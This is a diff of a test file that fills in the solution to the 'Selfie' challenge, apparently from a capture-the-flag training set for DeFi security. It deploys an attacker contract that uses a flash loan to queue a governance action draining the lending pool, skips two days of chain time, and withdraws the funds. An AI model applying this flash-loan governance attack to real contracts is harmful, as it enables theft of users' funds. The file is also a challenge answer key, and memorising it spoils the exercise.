@@ -30,7 +30,17 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // use loan to queue an action in governance to withdraw all funds in the pool
+        const HackSelfiePoolFactory = await ethers.getContractFactory('HackSelfiePool', attacker);
+        const hackSelfie = await HackSelfiePoolFactory.deploy(
+            this.token.address,
+            this.pool.address,
+            this.governance.address,
+        );
+
+        await hackSelfie.hack(TOKENS_IN_POOL);
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        await hackSelfie.withdraw();
     });
 
     after(async function () {
